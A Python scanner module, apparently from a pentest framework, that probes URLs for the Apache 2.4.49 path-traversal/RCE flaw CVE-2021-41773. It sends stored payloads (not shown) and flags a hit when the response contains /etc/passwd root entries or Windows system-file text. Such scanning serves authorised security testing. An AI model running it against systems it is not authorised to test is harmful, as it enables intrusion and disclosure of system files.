#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

def cve_2021_41773_scan(self, url):
    ''' 在 Apache HTTP Server 2.4.49 中对路径规范化所做的更改中发现了一个缺陷,
        攻击者可以使用路径遍历攻击将URL映射到网站根目录预期之外的文件
            在特定情况下, 攻击者可构造恶意请求执行系统命令
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE/FileRead'
    vul_info['vul_id'] = 'CVE-2021-41773'
    # vul_info['vul_method'] = 'GET/POST'
    vul_info['headers'] = {}

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    for payload in self.cve_2021_41773_payloads:
        path = payload['path']
        data = payload['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            if data:
                method = 'POST'
            else:
                method = 'GET'

            req = requests.Request(
                method=method,
                url=target,
                data=data,
                headers=self.headers
            ).prepare()

            req.url = target
            session = requests.session()

            res = session.send(
                req, 
                timeout=self.timeout, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG


            # todo 判断
            if ((self.md in check.check_res(res.text, self.md))
                or re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
                or (('Microsoft Corp' in res.text) 
                    and ('Microsoft TCP/IP for Windows' in res.text))
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
